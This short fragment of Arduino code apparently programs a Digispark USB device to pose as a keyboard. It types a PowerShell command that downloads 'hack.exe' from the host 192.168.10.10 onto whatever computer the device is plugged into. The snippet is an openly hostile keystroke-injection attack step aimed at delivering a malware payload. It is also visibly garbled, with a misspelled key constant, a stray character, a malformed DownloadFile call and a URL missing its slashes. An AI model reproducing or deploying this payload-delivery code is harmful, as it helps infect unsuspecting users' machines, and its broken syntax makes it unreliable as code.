  DigiKeyboard.SendKeyStroke(KEY_ENETR);
  DigiKeyboard.delay(1000);r
  DigiKeyboard.print(" $webClient.DownloadFile.('http:192.168.10.10/hack.exe','hack.exe')");
  DigiKeyboard.delay(1000);
